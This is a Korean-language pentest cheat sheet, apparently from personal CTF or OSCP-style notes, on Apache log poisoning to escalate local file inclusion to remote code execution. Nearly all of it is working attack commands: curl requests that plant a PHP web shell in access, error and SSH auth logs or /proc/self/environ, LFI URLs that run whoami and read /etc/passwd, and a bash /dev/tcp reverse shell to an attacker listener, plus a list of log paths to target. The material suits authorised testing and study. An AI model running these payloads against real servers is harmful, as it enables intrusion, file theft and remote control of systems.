# 03_로그포이즈닝

# Apache — 로그 포이즈닝 (LFI → RCE)

LFI가 가능할 때 Apache 로그에 PHP 코드를 주입하고, LFI로 해당 로그를 include해 RCE 달성.

---

## 사전 조건

- LFI 취약점 존재
- 로그 파일 읽기 권한 (www-data 기본 가능)

---

## Apache Access Log 포이즈닝

```bash
# 1단계: LFI로 로그 경로 확인
http://<IP>/index.php?page=/var/log/apache2/access.log
# → 로그 내용이 출력되면 성공

# 2단계: User-Agent에 PHP 웹쉘 주입
curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP>/
# 또는 더 짧게
curl -s http://<IP>/ -A '<?php system($_GET["cmd"]);?>'

# 3단계: LFI로 로그 include + 명령 실행
http://<IP>/index.php?page=/var/log/apache2/access.log&cmd=id
http://<IP>/index.php?page=/var/log/apache2/access.log&cmd=whoami
http://<IP>/index.php?page=/var/log/apache2/access.log&cmd=cat+/etc/passwd

# 4단계: 리버스 쉘
# 칼리에서 리스너: nc -lvnp 4444
http://<IP>/index.php?page=/var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<칼리IP>/4444+0>%261'

# URL 인코딩된 버전
curl "http://<IP>/index.php?page=/var/log/apache2/access.log&cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/<칼리IP>/4444%200>%261'"
```

---

## Apache Error Log 포이즈닝

Access log 접근 불가 시 대안

```bash
# 1단계: 존재하지 않는 경로로 PHP 코드가 담긴 404 유발
curl http://<IP>/AAAA<?php system($_GET['cmd']); ?>
# 또는
curl "http://<IP>/<script>" -v

# 2단계: error.log include
http://<IP>/index.php?page=/var/log/apache2/error.log&cmd=id
```

---

## SSH auth.log 포이즈닝

SSH 포트 열려 있을 때 활용 가능

```bash
# 1단계: SSH 사용자명 위치에 PHP 코드 주입
ssh '<?php system($_GET["cmd"]); ?>'@<IP>
# → 인증 실패하지만 auth.log에 기록됨

# 2단계: auth.log LFI로 include
http://<IP>/index.php?page=/var/log/auth.log&cmd=id
```

---

## /proc/self/environ 포이즈닝

```bash
# 1단계: User-Agent에 주입
curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP>/

# 2단계: environ include
http://<IP>/index.php?page=/proc/self/environ&cmd=id
```

---

## 로그 경로 목록

```
/var/log/apache2/access.log       Debian/Ubuntu
/var/log/apache2/error.log
/var/log/httpd/access_log         RHEL/CentOS
/var/log/httpd/error_log
/var/log/auth.log                 인증 로그
/var/log/syslog                   시스템 로그
/var/log/mail.log                 메일 로그 (SMTP 포이즈닝)
/var/log/vsftpd.log               FTP 로그
/var/log/pure-ftpd/pure-ftpd.log
/proc/self/environ                환경변수
```

---

## 팁

- 로그에 이전 요청이 많으면 스크롤 필요 → `?cmd=id` 처럼 짧은 명령으로 먼저 확인
- PHP 코드가 이미 실행됐으면 두 번 주입 안 해도 됨 (로그에 남아있음)
- 로그가 너무 크면 응답이 느려짐 → 빠른 리버스쉘 연결 필요
- PHP 코드 주입 시 따옴표 escaping 주의 (`\"` 또는 `\'`)
